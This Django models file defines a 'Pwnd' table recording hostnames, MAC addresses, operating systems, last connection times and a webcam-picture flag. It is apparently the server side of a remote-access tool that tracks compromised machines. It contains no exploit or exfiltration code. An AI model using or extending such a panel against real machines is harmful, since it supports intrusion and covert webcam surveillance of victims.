from django.db import models
import datetime

# Create your models here.

class Pwnd(models.Model):
    id = models.CharField(max_length=200, unique=True, primary_key=True)
    hostname = models.CharField(max_length=50)
    mac_address = models.CharField(max_length=50)
    system = models.CharField(max_length=50)
    latest_connection = models.DateTimeField(default=datetime.datetime.now())

    webcam_pic = [("true", "True"), ("false", "False")]
    webcam = models.CharField(max_length=5, default="false", choices=webcam_pic)